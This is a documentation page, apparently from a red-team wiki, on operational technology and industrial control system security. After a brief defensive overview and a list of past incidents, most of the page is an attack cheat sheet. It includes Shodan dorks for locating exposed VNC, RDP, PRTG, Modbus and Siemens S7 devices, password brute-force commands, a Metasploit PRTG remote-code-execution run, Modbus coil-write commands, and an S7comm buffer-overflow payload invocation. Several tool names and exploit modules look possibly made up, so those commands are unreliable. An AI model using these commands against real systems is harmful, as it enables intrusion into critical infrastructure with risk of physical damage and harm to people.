---
title: OT
sidebar: mydoc_sidebar
permalink: ot.html
folder: mydoc
---


## Introduction

OT (Operational Technology) security structure is a set of security measures and best practices designed to protect critical infrastructure and industrial control systems (ICS) that manage and monitor physical processes such as manufacturing, transportation, and energy distribution. The security structure includes several layers of security controls and policies that work together to protect OT systems from cyber threats.

Here are some key elements of an effective OT security structure:

1. **Network Segmentation**: The OT network should be segmented into different zones with varying levels of security controls. Each zone should have its own security policies and access controls.

2. **Access Controls**: Access to OT systems and devices should be limited to authorized personnel only. Strong authentication methods such as two-factor authentication should be used.

3. **Endpoint Protection**: All endpoints such as industrial controllers, sensors, and other devices should be secured with endpoint protection software, which can detect and prevent malware and unauthorized access.

4. **Vulnerability Management**: Regular vulnerability assessments and patching should be done to identify and fix vulnerabilities in OT systems and devices.

5. **Incident Response**: A well-defined incident response plan should be in place to respond to security incidents and minimize the impact of a breach.

6. **Training and Awareness**: Regular training and awareness programs should be conducted for employees and contractors to raise awareness of security risks and best practices.

7. **Compliance**: Compliance with industry-specific regulations and standards such as NIST SP 800-82 and IEC 62443 should be maintained to ensure the security of OT systems.


## Critical infrastructure


Critical infrastructure in OT (Operational Technology) refers to systems and assets that are essential for the functioning of a society, such as power grids, transportation systems, water treatment plants, and industrial control systems (ICS) used in manufacturing and energy production.
These include:

1. **Power Grids**: Electric power generation and distribution systems, including power plants, transmission lines, and transformers.

2. **Water Treatment Facilities**: Water purification and distribution systems, including water treatment plants, reservoirs, and pumping stations.

3. **Oil and Gas Pipelines**: Oil and gas pipelines that transport crude oil, natural gas, and refined petroleum products from production sites to refineries and distribution centers.

4. **Transportation Systems**: Transportation systems, including airports, seaports, and rail systems that transport people and goods.

5. **Industrial Control Systems**: Industrial control systems that control the operations of manufacturing plants and energy production facilities, including supervisory control and data acquisition (SCADA) systems, distributed control systems (DCS), and programmable logic controllers (PLC).

6. **Communication Networks**: Communication networks, including telephone networks, cellular networks, and internet service providers (ISP), which are essential for communication and data transmission.

7. **Financial Systems**: Financial systems, including banks, stock exchanges, and payment processing systems, which are essential for financial transactions and economic stability.

8. **Emergency Services**: Emergency services, including fire departments, police departments, and hospitals, which are essential for public safety and well-being.

9. **Government Services**: Government services, including government buildings, military installations, and intelligence agencies, which are essential for national security and government operations.

OT attacks on critical infrastructure can have severe consequences, including disruption of essential services, property damage, loss of life, and financial loss. Here are some examples of OT attacks on critical infrastructure:

1. **Stuxnet**: Stuxnet is a worm that was discovered in 2010 and is believed to be the first example of malware specifically designed to target industrial control systems. It targeted the nuclear program of Iran and was able to cause physical damage to centrifuges by exploiting vulnerabilities in the Siemens PLCs.

2. **Ukraine power outage**: In 2015 and 2016, Ukrainian power grids were targeted in a series of cyberattacks that resulted in a widespread power outage. The attackers were able to gain access to the ICS and cause physical damage to the equipment, resulting in the loss of power for hundreds of thousands of people.

3. **Triton**: Triton is a malware that was discovered in 2017 and is designed to target safety systems in industrial control systems. It was used in an attack on a Saudi Arabian petrochemical plant, and its purpose was to cause physical damage to the plant by disabling its safety systems.

4. **Colonial Pipeline**: In May 2021, a ransomware attack on the Colonial Pipeline, which supplies fuel to the eastern United States, resulted in a temporary shutdown of the pipeline. This caused a disruption in fuel supply and resulted in panic buying and long lines at gas stations.



## VNC

VNC (Virtual Network Computing) is a popular remote desktop sharing protocol that allows a user to control a computer over a network connection. In the context of red teaming for OT attacks, VNC can be used to gain remote access to an Industrial Control System (ICS) or Supervisory Control and Data Acquisition (SCADA) system. This could be done by exploiting vulnerabilities in the system or by using phishing attacks to gain access to an employee's computer with administrative access to the ICS or SCADA system


Find VNC Server:


Shodan: 

```text
vnc country: [two letter country code]
```

or

```text
nmap -p 5900 [target IP address]
```

or

```text
nc [target IP address] 5900
```


To Connect:

```text
vncviewer -autopass [target IP address]:[display number]
```

to Crack:


```text
use auxiliary/scanner/vnc/vnc_login
set rhosts [target IP address]
set user_file [path to username file]
set pass_file [path to password file]
run
```

or

```text
vncrack -P /path/to/password/file.txt -u username -H <IP address> -v <VNC port>
```

or

```text
hydra -L usernames.txt -P passwords.txt -s 5900 -f -vV <target_ip> vnc
```


## RDP


To Find: 

Shodan: 

```text
rdp country: [two letter country code]
```

or

```text
nmap -sS -p 3389 [target IP address]
```

or

```text
masscan -p3389 192.168.1.0/24 --rate=10000
```

or

```text
nc -zv 192.168.1.1 3389
```

or

```
hping3 -S 192.168.1.0/24
```

or

```
unicornscan -mT 192.168.1.0/24:a
```


To Crack:

```
hydra -l username -P /path/to/wordlist.txt rdp://targetip
```

or

```
medusa -u username -P /path/to/wordlist.txt -h targetip -M rdp
```

or

```
ncrack -vv --user username -P /path/to/wordlist.txt rdp://targetip
```

or

```
crowbar -b rdp -s targetip/32
```

To Connect:

```
rdesktop -u username -p password -g 1024x768 -a 16 x.x.x.x
```

or

```
xfreerdp /u:username /p:password /v:rdp-server
```

or

```
remmina --connect rdp://username:password@rdp-server
```

or

```
vinagre -c "rdp://username:password@rdp-server"
```

## PRTG


Reconnaissance


Shodan
```
"title:PRTG inurl:/index.htm?tabid=0&sort=Errors&filter_status=-1"
```

or

```
"html:"PRTG Traffic Grapher""
```

Censys

```
"p443.title: PRTG Traffic Grapher"
```

or

```
"autonomous_system.organization: Paessler AG" 
```


or

```
nmap -sn 192.168.1.0/24
nmap -p 80,443,8443 192.168.1.0/24
```

Enumerate PRTG servers:

```
msfconsole -q
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set RPORT 80
set THREADS 5
set PATH /
run
```

Exploit the PRTG server:

```
msfconsole -q
use exploit/windows/http/prtg_authenticated_rce
set RHOST 192.168.1.10
set RPORT 80
set LHOST 192.168.1.20
set LPORT 4444
set TARGETURI /
run
```

## SQL

Enumerate

```
nmap -sS -p 1433 -oA outputfile 192.168.1.1/24
```

Crack

```
hydra -L users.txt -P passwords.txt -vV <target_ip> sql-server
```


## industrial control systems(ics)

Reconnaissance

```
nmap -p 102,502 -sV <target_ip>
```

This shodan dork searches for Modbus servers, which are commonly used in ICS systems.

```
"port:502 modbus"
```

and


```
"port:44818"
```

This dork searches for PLCs (Programmable Logic Controllers) that use the proprietary Rockwell Automation protocol.


```
"port:1911
```

This dork searches for the Foxboro I/A Series Distributed Control Systems (DCS), which are used in various industries such as oil and gas, chemical and power generation.


```
"port:102
```

This dork searches for Siemens SIMATIC S7 PLCs, which are used in industrial automation and control.


```
"port:20000"
```


This dork searches for the Schneider Electric Modicon Modbus Protocol, which is used in various industrial control applications.



## TR-069

TR-069 is a protocol used by ISPs to remotely manage customer routers. Attackers can exploit vulnerabilities in this protocol to take control of the router.


```
python3 genieacs.py --list
```

## Modbus

Modbus is a protocol used in industrial control systems. Attackers can exploit vulnerabilities in Modbus to take control of these systems.

```
modscan.py -a <target> -p 502 -t 0 -r 1-100
```

or

This command targets the Modbus protocol and attempts to trigger a "write single coil" command to turn on a specific output on the target device.


```
"modscan.py --ip-address <target IP> --port 502 --unit 1 --function-code 5"
```

This command uses the modpoll tool to query the Modbus register at address 1 of a device with the IP address 192.168.0.10. The -t 4 option specifies that the tool should use the Modbus function code 4, which is used for reading input registers. An attacker can use this command to extract data from an OT system or to test if it is vulnerable to Modbus protocol attacks.


```
modpoll -m tcp -a 1 -r 1 -c 1 -t 4 -1 192.168.0.10
```


## DNP3

DNP3 is a protocol used in SCADA systems. Attackers can exploit vulnerabilities in DNP3 to take control of these systems.

```
python3 dnp3-master.py -i eth0 -a <target> -p 20000 -o 3 -c 1 -v
```

## EtherNet/IP

This command targets the EtherNet/IP protocol used in industrial control systems and attempts to send a command to turn on a specific output on the target device.

```
"python enip-exploit.py -i <target IP> -o 3 -v 1"
```

## BACnet 


This command targets the BACnet protocol and attempts to read a value from a specific object on the target device, which can provide information that could be used in further attacks.

```
"bacnet_scan.py -ip <target IP> -p 47808 -d 4194303 -a 1 -t 0"
```

## S7comm


This command targets the S7comm protocol used in Siemens PLCs and sends a crafted payload to cause a buffer overflow and execute arbitrary code on the target device.


```
"python S7comm_payload.py <target IP> 102 --payload 1 --offset 14"
```

## Exploitation

S7comm exploit

```
use exploit/windows/scada/s7comm_plus_wincc_opc
```

Modbus exploit

```
use exploit/windows/scada/modbus_write_registers
```


## resources

-	https://github.com/hslatman/awesome-industrial-control-system-security
-	https://www.b-sec.net/en/assessment/
-	https://github.com/rezaduty/awesome-ics-writeups




{% include links.html %}
